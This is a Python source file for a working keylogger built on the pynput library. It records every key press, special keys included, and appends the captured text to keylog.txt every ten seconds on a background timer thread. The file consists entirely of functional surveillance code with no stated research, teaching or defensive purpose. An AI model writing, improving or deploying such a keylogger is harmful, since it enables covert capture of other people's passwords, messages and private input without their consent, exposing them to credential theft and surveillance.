import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time_interval, log_file):
        self.log = ""  # Buffer to store key logs
        self.interval = time_interval  # Time interval for reporting
        self.log_file = log_file  # File to save logs
        self.lock = threading.Lock()  # Lock for thread-safe operations

    def append_to_log(self, string):
        """Append a string to the log buffer in a thread-safe manner."""
        with self.lock:
            self.log += string

    def process_key_press(self, key):
        """Handle a key press event."""
        try:
            current_key = str(key.char)  # Capture printable character keys
        except AttributeError:
            if key == key.space:
                current_key = " "  # Replace space key with a space
            else:
                current_key = f"[{str(key)}]"  # Handle special keys
        self.append_to_log(current_key)

    def report(self):
        """Write the current log buffer to the file and clear it."""
        with self.lock:
            if self.log:  # Write only if there is data in the buffer
                try:
                    with open(self.log_file, "a") as file:
                        file.write(self.log + "\n")
                        #print(f"Log buffer: {self.log}")
                except IOError as e:
                    print(f"Error writing to log file: {e}")
                self.log = ""  # Clear the log buffer after writing

        # Schedule the next report
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        """Start the keylogger and begin listening for key presses."""
        with pynput.keyboard.Listener(on_press=self.process_key_press) as listener:
            self.report()  # Start the reporting loop
            listener.join()

def main():
    try:
        keylogger = Keylogger(10, "keylog.txt")  # Log every 10 seconds
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped. Exiting cleanly.")
        # Optionally, you could save any unsaved log data here

if __name__ == "__main__":
    main()
